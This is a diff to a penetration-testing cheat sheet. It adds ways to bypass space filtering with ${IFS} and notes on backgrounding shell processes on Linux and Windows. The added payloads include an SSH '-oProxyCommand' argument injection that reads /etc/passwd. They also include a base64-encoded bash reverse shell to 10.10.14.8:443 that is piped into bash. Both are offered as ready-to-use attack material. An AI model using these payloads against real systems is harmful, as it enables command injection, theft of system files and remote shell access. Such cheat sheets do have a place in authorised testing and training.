@@ -305,6 +305,13 @@ Whenever encoding and decoding a reverse shell in base 64, remove the special ch
 
 #### No Spaces in Payload Work-Around
 
+You can replace the whitespaces by a variable that is a whitespace, either by creating it, or using '${IFS}'.
+
+```bash
+'-oProxyCommand="cat /etc/passwd"'${IFS}kanderson
+-h;echo${IFS}-n${IFS}YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC80NDMgICAwPiYxICAg|base64${IFS}-d|bash${IFS};#
+```
+
 ```bash
 {echo,-n,**base64 encoded reverse bash shell**}|{base64,-d}|bash
 ```
@@ -540,7 +547,13 @@ Nessus-10.5.0-debian10_amd64.deb: OK
 Let's say that you're executing a reverse shell (from a reverse shell), and you don't want that shell to just hang there, simply append an '&' to the end of your command and it will background the reverse shell process:
 
 ```bash
+#Linux
 ./binary444&
+```
+
+```bash
+#Windows
+Start-Process -NoNewWindow .\binary80.exe
 ```
 
 #### Check What Process is Running on a Port
